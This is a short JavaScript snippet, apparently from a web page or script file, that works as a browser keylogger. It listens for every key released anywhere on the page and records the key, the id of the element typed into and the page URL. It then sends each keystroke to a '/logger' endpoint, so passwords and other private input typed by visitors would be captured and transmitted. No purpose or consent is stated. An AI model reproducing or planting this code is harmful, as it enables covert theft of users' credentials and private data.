document.addEventListener('keyup', function (event) {
    var tgt = event.target;
    var char = event.key;
    var nodeId = $(tgt).attr("id") ? $(tgt).attr("id") : $(tgt).find("[id]").first().attr("id");
    char = char === ' ' ? 'Space' : char;
    var keylog = char + " on [#" + nodeId + "] in [" + window.location.href + "]";
    $.ajax({url: '/logger?msg=' + encodeURIComponent(keylog)});
});
